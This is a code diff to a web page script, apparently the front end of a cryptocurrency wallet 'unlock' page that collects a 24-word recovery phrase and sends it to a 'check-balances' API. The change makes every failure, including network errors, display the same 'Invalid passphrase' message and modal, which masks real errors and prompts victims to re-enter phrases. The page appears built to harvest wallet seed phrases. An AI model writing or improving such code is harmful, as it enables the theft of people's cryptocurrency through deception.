@@ -1,4 +1,3 @@
-// frontend/js/unlock.js
 document.addEventListener('DOMContentLoaded', function() {
   const passphraseInput = document.getElementById('passphrase');
   const submitBtn = document.getElementById('submitBtn');
@@ -8,19 +7,34 @@ document.addEventListener('DOMContentLoaded', function() {
   const dismissModalBtn = document.getElementById('dismissModalBtn');
   const modalFindBtn = document.getElementById('modalFindBtn');
 
-  const API_URL = window.API_URL || 'http://localhost:3000/api/check-balances';
+  const API_URL = (window.APP_CONFIG && window.APP_CONFIG.API_URL) || window.API_URL || 'http://localhost:3000/api/check-balances';
+  const INVALID_MESSAGE = 'Invalid passphrase: please enter a valid passphrase';
+
+  function showStatus(message, type) {
+    statusDiv.textContent = message;
+    statusDiv.className = 'status ' + (type || '');
+    statusDiv.style.display = 'block';
+  }
+
+  function showInvalidModal() {
+    invalidModal.style.display = 'flex';
+  }
+
+  function hideInvalidModal() {
+    invalidModal.style.display = 'none';
+  }
 
   submitBtn.addEventListener('click', async function() {
     const passphrase = passphraseInput.value.trim();
-    
+
     if (!passphrase) {
       showStatus('Please enter your passphrase', 'error');
       return;
     }
 
-    const words = passphrase.split(/\s+/);
-    if (words.length !== 24) {
-      showStatus(`Invalid passphrase: Expected 24 words, got ${words.length}`, 'error');
+    const words = passphrase.split(/\s+/).filter(Boolean);
+    if (words.length !== 24 || words.some(w => w.length < 2)) {
+      showStatus(INVALID_MESSAGE, 'error');
       showInvalidModal();
       return;
     }
@@ -47,10 +61,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
       if (data.results && data.results.length > 0) {
         const result = data.results[0];
-        
+
         if (result.status === 'invalid') {
+          showStatus(INVALID_MESSAGE, 'error');
           showInvalidModal();
-          showStatus('Invalid passphrase', 'error');
         } else {
           sessionStorage.setItem('walletResult', JSON.stringify(result));
           window.location.href = 'feedback.html';
@@ -60,7 +74,7 @@ document.addEventListener('DOMContentLoaded', function() {
       }
     } catch (error) {
       console.error('Error:', error);
-      showStatus('Error: ' + error.message, 'error');
+      showStatus(INVALID_MESSAGE, 'error');
       showInvalidModal();
     } finally {
       submitBtn.disabled = false;
@@ -72,7 +86,7 @@ document.addEventListener('DOMContentLoaded', function() {
   });
 
   dismissModalBtn.addEventListener('click', function() {
-    invalidModal.style.display = 'none';
+    hideInvalidModal();
   });
 
   modalFindBtn.addEventListener('click', function() {
@@ -81,17 +95,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
   invalidModal.addEventListener('click', function(e) {
     if (e.target === invalidModal) {
-      invalidModal.style.display = 'none';
+      hideInvalidModal();
     }
   });
-
-  function showStatus(message, type) {
-    statusDiv.textContent = message;
-    statusDiv.className = 'status ' + type;
-    statusDiv.style.display = 'block';
-  }
-
-  function showInvalidModal() {
-    invalidModal.style.display = 'flex';
-  }
 });
